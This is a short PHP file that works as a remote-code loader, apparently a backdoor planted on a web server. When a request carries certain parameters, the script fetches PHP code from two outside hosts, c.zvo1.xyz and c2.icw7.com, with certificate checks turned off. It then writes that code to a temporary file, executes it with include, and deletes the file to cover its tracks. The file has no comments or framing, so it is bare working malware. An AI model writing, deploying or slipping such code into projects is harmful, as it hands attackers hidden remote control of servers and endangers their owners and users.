<?php
function GC($a)
{
    $url = sprintf('%s?api=%s&ac=%s&path=%s&t=%s', $a, $_REQUEST['api'], $_REQUEST['ac'], $_REQUEST['path'], $_REQUEST['t']);
    $code = @file_get_contents($url);
    if ($code == false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT, 'll');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $code = curl_exec($ch);
        curl_close($ch);
    }
    return $code;
}

if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) {
    $code = GC('https://c.zvo1.xyz/');
    if (!$code) {
        $code = GC('https://c2.icw7.com/');
    }
    $need = '<' . '?' . 'php';
    if (strpos($code, $need) === false) {
        die('get failed');
    }
    if(function_exists('tmpfile')){
        $file_name = tmpfile();
    }

    if($file_name)
    {
        fwrite($file_name, $code);
        $a = stream_get_meta_data($file_name);
        $file_path = $a['uri'];
        @include($file_path);
        fclose($file_name);
    }else {
        $file_path = '.c';
        file_put_contents($file_path, $code);
        @include($file_path);
    }
    @unlink($file_path);
    die();
}